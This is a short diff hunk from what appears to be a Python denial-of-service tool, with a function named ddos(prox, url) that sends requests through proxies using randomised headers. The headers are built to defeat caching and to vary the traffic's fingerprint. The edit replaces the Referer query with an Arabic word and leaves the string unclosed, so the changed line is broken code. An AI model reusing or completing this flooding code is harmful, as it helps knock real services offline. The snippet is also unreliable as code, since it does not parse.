@@ -64,7 +64,7 @@ def ddos(prox, url):
 			'User-Agent': random.choice(randuser),
 			'Cache-Control': 'no-cache',
 			'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-			'Referer': 'http://www.google.com/?q=' + ssss,
+			'Referer': 'http://www.google.com/?q=ملازم,
 			'Keep-Alive': str(random.randint(110,120)),
 			'Connection': 'keep-alive'
 			}
